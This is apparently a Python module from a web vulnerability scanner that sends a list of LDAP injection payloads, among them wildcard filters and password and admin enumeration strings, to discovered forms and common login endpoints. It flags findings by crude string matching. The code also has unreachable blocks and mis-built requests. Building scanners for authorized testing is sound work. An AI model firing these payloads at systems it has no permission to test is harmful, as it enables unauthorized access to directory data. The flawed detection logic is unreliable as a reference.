from core.scanner_imports import *
from core.base_scanner import BaseScanner
from core.utils import RequestUtils
from typing import Dict, List, Optional
import logging
from urllib.parse import urljoin
import re

class LDAPInjectionScanner(BaseScanner):
    def __init__(self, target_url: str, config: Dict):
        super().__init__(target_url, config)
        # More aggressive payloads
        self.payloads = [
            "*",                           # Basic wildcard
            "*)",                          # Closing parenthesis
            "*(",                          # Opening parenthesis
            "*)(cn=*)",                    # Common pattern
            "*)(uid=*",                    # UID search
            "*)(|(uid=*))",                # OR condition
            "*)(cn=admin)(cn=*",           # Admin search
            "*)(uid=admin)(uid=*)",        # Admin injection
            "admin*",                      # Admin prefix
            "*)(&)",                       # AND condition
            "*)(|(password=*))",           # Password enumeration
            "*()|&'",                      # Filter breaking
            "*/*",                         # Path traversal
            "admin*))%00",                 # Null byte
            ")(cn=*)))\x00",              # Binary null
            "*)(|(objectClass=*))",        # Object enumeration
            "*)(department=*)"             # Department enumeration
        ]

    def scan(self) -> Dict:
        try:
            tasks = []
            response = self.make_request(self.target_url)
            
            if not response:
                return {'ldap_injection': []}

            # Scan login forms
            forms = self.extract_forms(response.text)
            for form in forms:
                for input_field in form.get('inputs', []):
                    if input_field.get('type') in ['text', 'password']:
                        tasks.append({
                            'url': form.get('action', self.target_url),
                            'method': form.get('method', 'POST'),
                            'parameter': input_field.get('name', ''),
                            'type': 'form'
                        })

            # Test common LDAP endpoints
            endpoints = ['/login', '/auth', '/ldap', '/search']
            for endpoint in endpoints:
                url = f"{self.target_url.rstrip('/')}{endpoint}"
                tasks.append({
                    'url': url,
                    'method': 'GET',
                    'parameter': 'username',
                    'type': 'endpoint'
                })

            results = self.run_concurrent_tasks(tasks)
            return {'ldap_injection': [r for r in results if r]}
            results = []
            
            # Test all forms regardless of endpoint
            response = self.make_request(self.target_url)
            if response:
                forms = RequestUtils.extract_forms(response.text)
                for form in forms:
                    form_url = urljoin(self.target_url, form['action'] or self.target_url)
                    for input_field in form['inputs']:
                        if input_field['type'] in ['text', 'password', 'search']:
                            for payload in self.payloads:
                                test_result = self.test_ldap_injection(
                                    form_url,
                                    form['method'],
                                    input_field['name'],
                                    payload
                                )
                                if test_result:
                                    results.append({
                                        'url': form_url,
                                        'method': form['method'],
                                        'parameter': input_field['name'],
                                        'payload': payload,
                                        'type': 'LDAP Injection',
                                        'severity': 'High',
                                        'evidence': test_result
                                    })

            # Test common endpoints
            test_endpoints = [
                '/ldap', '/login', '/auth', '/search', '/user', '/admin',
                '/directory', '/profile', '/account', '/', '/api/users'
            ]

            for endpoint in test_endpoints:
                endpoint_url = urljoin(self.target_url, endpoint)
                for param in ['username', 'user', 'query', 'q', 'search', 'id', 'uid']:
                    for payload in self.payloads:
                        test_result = self.test_ldap_injection(
                            endpoint_url,
                            'GET',
                            param,
                            payload
                        )
                        if test_result:
                            results.append({
                                'url': endpoint_url,
                                'method': 'GET',
                                'parameter': param,
                                'payload': payload,
                                'type': 'LDAP Injection',
                                'severity': 'High',
                                'evidence': test_result
                            })

            return {'ldap_injection': results}

        except Exception as e:
            logging.error(f"LDAP Injection scanner error: {e}")
            return {'ldap_injection': [], 'error': str(e)}

    def execute_task(self, task: Dict) -> Optional[Dict]:
        """
        Execute LDAP injection test for a specific task
        
        Args:
            task (Dict): Task configuration for injection testing
        
        Returns:
            Optional vulnerability details
        """
        results = []
        
        # Iterate through payloads
        for payload in self.payloads:
            try:
                # Prepare injection request
                modified_params = task.copy()
                modified_params[task['parameter']] = payload
                
                # Send request with payload
                response = self.make_request(
                    task['url'], 
                    method=task['method'], 
                    data=modified_params
                )
                
                # Check for injection indicators
                if self.verify_ldap_injection(response, payload):
                    return {
                        'url': task['url'],
                        'method': task['method'],
                        'parameter': task['parameter'],
                        'payload': payload,
                        'type': 'LDAP Injection',
                        'severity': 'High',
                        'description': f'Potential LDAP injection vulnerability detected with payload: {payload}',
                        'recommendation': 'Implement strict input validation and sanitization for LDAP queries'
                    }
            
            except Exception as e:
                logging.error(f"LDAP Injection test error: {e}")
        
        return None
    
    def verify_ldap_injection(self, response, payload: str) -> bool:
        """
        Verify if the response indicates a successful LDAP injection
        
        Args:
            response: HTTP response object
            payload (str): Injected payload
        
        Returns:
            bool: True if LDAP injection is detected
        """
        if not response:
            return False
        
        # Convert response to string for analysis
        response_text = str(response.text).lower()
        
        # Injection detection indicators
        injection_indicators = [
            # Successful injection markers
            'ldap',
            'cn=',            # Common Name attribute
            'uid=',           # User ID attribute
            'objectclass=',   # Object class indicator
            'memberof=',      # Group membership
            
            # Potential error or information disclosure
            'directory service',
            'authentication failed',
            'user not found',
            'invalid credentials',
            
            # Wildcard and filter manipulation signs
            payload.lower(),  # Original payload might be reflected
            '*)',             # Wildcard or filter manipulation
            '(&',             # Logical AND in LDAP filter
            '(|',             # Logical OR in LDAP filter
        ]
        
        # Check for console-based attack confirmation
        console_script = f"""
        <script>
        console.warn('LDAP Injection Detected: {payload}');
        console.log('Potential Vulnerability: Input not properly sanitized');
        </script>
        """
        
        # Detailed logging and console warning
        if any(indicator in response_text for indicator in injection_indicators):
            logging.warning(f"LDAP Injection detected with payload: {payload}")
            return True
        
        return False

    def extract_forms(self, html: str) -> List[Dict]:
        try:
            from bs4 import BeautifulSoup
            soup = BeautifulSoup(html, 'html.parser')
            forms = []
            
            for form in soup.find_all('form'):
                inputs = []
                for input_field in form.find_all(['input', 'textarea']):
                    inputs.append({
                        'name': input_field.get('name', ''),
                        'type': input_field.get('type', 'text')
                    })
                
                forms.append({
                    'action': form.get('action', ''),
                    'method': form.get('method', 'get').upper(),
                    'inputs': inputs
                })
            
            return forms
        except Exception as e:
            logging.error(f"Error extracting forms: {e}")

    def extract_url_parameters(self, url: str) -> List[str]:
        try:
            from urllib.parse import urlparse, parse_qs
            parsed_url = urlparse(url)
            params = parse_qs(parsed_url.query)
            return list(params.keys())
        except Exception as e:
            logging.error(f"Error extracting URL parameters: {e}")
            return []
